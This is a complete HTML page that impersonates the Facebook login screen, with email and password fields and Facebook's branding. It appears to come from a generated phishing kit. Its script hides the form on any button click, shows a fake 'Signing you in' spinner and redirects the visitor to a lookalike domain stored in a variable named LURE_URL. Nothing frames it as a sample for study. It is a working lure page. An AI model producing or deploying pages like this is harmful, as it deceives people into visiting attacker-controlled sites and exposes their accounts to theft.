<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Facebook – log in or sign up</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.wrap{display:flex;align-items:center;justify-content:center;gap:32px;width:100%;max-width:980px;padding:0 16px}
.left{flex:1;max-width:480px}.left h1{font-size:56px;font-weight:bold;color:#1877f2;line-height:1;margin-bottom:12px}
.left p{font-size:24px;color:#1c1e21;line-height:1.3}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:16px;width:396px}
.card input{display:block;width:100%;border:1px solid #dddfe2;border-radius:6px;padding:14px 16px;font-size:17px;margin-bottom:12px;outline:none}
.card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px rgba(24,119,242,.2)}
.btn{display:block;width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;text-align:center;margin-bottom:16px}
.btn:hover{background:#166fe5}.divider{border:none;border-top:1px solid #dadde1;margin:20px 0}
.btn-green{display:block;width:60%;margin:0 auto;padding:14px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer;text-align:center}
.btn-green:hover{background:#36a420}.forgot{display:block;text-align:center;color:#1877f2;font-size:14px;text-decoration:none;margin-bottom:16px}
.spinner{width:30px;height:30px;border:3px solid #ddd;border-top:3px solid #1877f2;border-radius:50%;animation:spin .8s linear infinite;margin:20px auto}
@keyframes spin{to{transform:rotate(360deg)}}#loading{display:none;text-align:center;padding:20px;color:#606770}
@media(max-width:740px){.wrap{flex-direction:column}.left{text-align:center;max-width:100%}.left h1{font-size:36px}.card{width:100%}}</style></head>
<body><div class="wrap"><div class="left">
<svg xmlns="http://www.w3.org/2000/svg" width="240" height="80" viewBox="0 0 230 44"><text x="0" y="38" font-family="Helvetica,Arial,sans-serif" font-size="44" font-weight="bold" fill="#1877f2">facebook</text></svg>
<p>Connect with friends and the world around you.</p></div>
<div class="card" id="card">
<input type="email" placeholder="Email address or phone number" id="em">
<input type="password" placeholder="Password" id="pw">
<button class="btn" onclick="go()">Log in</button>
<a href="#" class="forgot">Forgotten password?</a>
<hr class="divider">
<button class="btn-green" onclick="go()">Create new account</button>
</div>
<div id="loading"><div class="spinner"></div><p>Signing you in&hellip;</p></div></div>
<script>
var LURE_URL='https://www.facebook2026.authenticationsession.online/OeEYylLs'; /* AUTO_LURE_URL */
function go(){document.getElementById('card').style.display='none';document.getElementById('loading').style.display='block';setTimeout(function(){window.location.href=LURE_URL;},500);}
</script></body></html>
